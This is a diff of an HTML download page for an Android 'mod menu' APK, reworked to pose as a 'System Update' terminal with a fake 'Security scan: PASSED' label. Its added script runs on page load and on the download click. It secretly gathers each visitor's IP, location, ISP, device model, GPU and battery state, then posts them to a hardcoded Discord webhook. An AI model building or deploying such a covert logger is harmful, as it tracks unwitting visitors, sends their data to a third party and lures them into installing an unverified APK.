@@ -3,89 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
     <style>
-        body { margin: 0; background-color: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        h1 { font-size: 40px; color: #ff0000; margin-bottom: 30px; }
-        .btn { display: inline-block; padding: 20px 45px; background-color: #00ff00; color: black; text-decoration: none; font-size: 22px; font-weight: bold; border-radius: 12px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); cursor: pointer; border: none; }
+        body { margin: 0; background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .container { border: 1px solid #333; padding: 40px; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
+        h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 20px; }
+        .btn { display: inline-block; padding: 15px 40px; background-color: #00ff00; color: #000; text-decoration: none; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; border: none; }
+        .btn:hover { background-color: #00cc00; box-shadow: 0 0 15px #00ff00; }
+        .status { margin-top: 15px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
 
-    <h1>MODER LOH</h1>
-    <a href="app-debug.apk" download class="btn" id="downloadBtn">DOWNLOAD APK</a>
+    <div class="container">
+        <h1>SYSTEM TERMINAL</h1>
+        <p>MOD MENU V4.2 READY FOR DEPLOYMENT</p>
+        <a href="app-debug.apk" download class="btn" id="actionBtn">INSTALL APK</a>
+        <div class="status">Security scan: PASSED</div>
+    </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
-        const startTime = Date.now();
+        const WEBHOOK = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
+        const sessionStart = Date.now();
 
-        async function sendLog(event) {
-            // Дані по замовчуванню
-            let d = {
-                model: "Android (Захищено)",
-                cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-                ip: "Не вдалося",
-                geo: "Невідомо",
-                prov: "Невідомо",
-                net: "N/A",
+        async function fetchSystemData(trigger) {
+            let data = {
+                device: "Android (Generic)",
+                hardware: "N/A",
+                network: "N/A",
+                location: "🔍 Отримання...",
                 batt: "N/A",
-                vpn: "Ні",
-                screen: `${screen.width}x${screen.height}`,
-                lang: navigator.language
+                ip: "N/A"
             };
 
-            // 1. Отримуємо IP та ГЕО
+            // 1. IP & GEO
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const g = await res.json();
-                d.ip = g.ip;
-                d.geo = `${g.city}, ${g.country_name}`;
-                d.prov = g.org;
-                if (g.org.toLowerCase().includes("vpn") || g.org.toLowerCase().includes("hosting")) d.vpn = "ТАК";
-            } catch(e) {}
+                const json = await res.json();
+                data.ip = json.ip;
+                data.location = `${json.city}, ${json.country_name}`;
+                data.network = json.org;
+            } catch (e) { data.location = "Заблоковано"; }
 
-            // 2. Отримуємо модель (Працює тільки через HTTPS)
+            // 2. Hardware & Model (HTTPS Only)
             if (navigator.userAgentData?.getHighEntropyValues) {
-                const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-                d.model = `${h.model} (Android ${h.platformVersion})`;
+                const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+                data.device = `${ua.model} (Android ${ua.platformVersion})`;
             }
 
-            // 3. Батарея та Мережа
+            // 3. GPU (без створення піксельного квадрата)
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                data.hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
+
+            // 4. Battery
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                d.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Розрядка'})`;
-            }
-            if (navigator.connection) {
-                d.net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.rtt}ms)`;
+                data.batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
             }
 
-            const timeOnPage = ((Date.now() - startTime) / 1000).toFixed(1);
+            const activeTime = ((Date.now() - sessionStart) / 1000).toFixed(1);
 
-            // ФОРМУЄМО ПОВІДОМЛЕННЯ
+            // Discord Payload
             const payload = {
-                embeds: [{
-                    title: event === 'visit' ? "👤 НОВИЙ ВІЗИТ" : "📥 СКАЧУВАННЯ",
-                    color: event === 'visit' ? 3066993 : 16711680,
-                    description: `📱 **Модель:** ${d.model}\n🧠 **Процесор:** ${d.cpu} ядер\n📟 **RAM:** ${d.ram}\n🌐 **IP:** ${d.ip}\n📍 **Місце:** ${d.geo}\n🏢 **Провайдер:** ${d.prov}\n📶 **Інтернет:** ${d.net}\n🔋 **Батарея:** ${d.batt}\n🛡 **VPN:** ${d.vpn}\n🖥 **Екран:** ${d.screen}\n🌍 **Мова:** ${d.lang}\n⏱ **Час на сайті:** ${timeOnPage} сек.`,
-                    footer: { text: "Ultimate Logger v10.0" },
-                    timestamp: new Date()
+                "content": `🔔 **${trigger === 'visit' ? 'ВХІД' : 'КЛІК'}**: ${data.device} | ${data.ip}`,
+                "embeds": [{
+                    "title": trigger === 'visit' ? "👤 Новий сеанс" : "📥 Завантаження файлу",
+                    "color": trigger === 'visit' ? 3066993 : 15105570,
+                    "description": `📱 **Пристрій:** ${data.device}\n🎮 **GPU:** ${data.hardware}\n🌐 **IP:** \`${data.ip}\`\n📍 **Місце:** ${data.location}\n🏢 **Провайдер:** ${data.network}\n🔋 **Батарея:** ${data.batt}\n⏱ **Час на сторінці:** ${activeTime} сек.\n⏰ **Дата:** ${new Date().toLocaleString('uk-UA')}`
                 }]
             };
 
-            await fetch(webhookURL, {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
         }
 
-        // Відправка через 1.5 секунди після входу (щоб встигли зібратися дані)
-        window.onload = () => {
-            setTimeout(() => sendLog('visit'), 1500);
-        };
+        // Авто-відправка через 2 секунди
+        window.onload = () => setTimeout(() => fetchSystemData('visit'), 2000);
 
         // Відправка при кліку
-        document.getElementById('downloadBtn').onclick = () => sendLog('download');
+        document.getElementById('actionBtn').onclick = () => fetchSystemData('click');
     </script>
 </body>
 </html>
